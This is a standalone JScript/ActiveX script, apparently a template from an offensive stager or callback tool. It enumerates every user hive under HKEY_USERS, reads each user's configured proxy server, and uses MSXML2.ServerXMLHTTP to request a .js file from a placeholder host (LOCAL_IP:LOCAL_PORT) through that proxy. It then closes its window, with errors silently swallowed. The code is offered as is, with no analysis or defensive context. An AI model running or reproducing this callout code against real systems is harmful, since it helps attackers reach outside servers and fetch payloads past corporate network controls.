var WshShell = new ActiveXObject("Wscript.Shell");

// Constant for HKEY_LOCAL_MACHINE...
var HKLM = 0x80000002;
// HKEY_USERS
var HKU = 0x80000003;

// Get an instance of the StdRegProv class...
var objService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default");
var objReg = objService.Get("StdRegProv");

// Prepare the EnumKey method...
var objMethod = objReg.Methods_.Item("EnumKey"); 
var objParamsIn = objMethod.InParameters.SpawnInstance_(); 
objParamsIn.hDefKey = HKU; 
objParamsIn.sSubKeyName = ""; 

// Execute the method and collect the output...
var objParamsOut = objReg.ExecMethod_(objMethod.Name, objParamsIn); 

// If successful, iterate the subkeys...
if (objParamsOut.ReturnValue === 0) {
    if (objParamsOut.sNames != null) {
        var a = objParamsOut.sNames.toArray();
        for (var i = 0; i < a.length; ++i) {
            //WScript.Echo(a[i]);
			try {
				regvalue = WshShell.RegRead("HKEY_USERS\\"+a[i]+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer");
				//WScript.Echo(regvalue);
				var url = 'http://LOCAL_IP:LOCAL_PORT/HTTP_11_serverxmlhttp_p_KKU.js';
				var Object = new ActiveXObject('MSXML2.ServerXMLHTTP');
				Object.open('GET', url, false);
				Object.setProxy(2,regvalue);
				Object.send();
				window.close()
			}
			catch(e2) {
			}
        }
    }
}